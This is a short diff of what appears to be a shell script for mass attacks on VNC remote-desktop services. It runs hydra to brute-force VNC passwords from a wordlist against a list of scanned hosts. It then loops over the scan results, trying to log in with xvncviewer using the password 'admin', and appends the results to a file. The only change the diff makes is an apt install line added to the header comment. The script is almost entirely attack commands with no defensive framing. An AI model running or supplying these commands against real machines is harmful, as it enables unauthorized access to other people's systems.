@@ -1,4 +1,4 @@
-#Sample
+#Sample sudo apt install libparallel-forkmanager-perl
 hydra -o done -P password -t 9 -M vnc*
 cat scan  | 
 xargs -rn 1 -I{}  echo echo \"admin\" \|  xvncviewer  -autopas {}  >> idzpredz
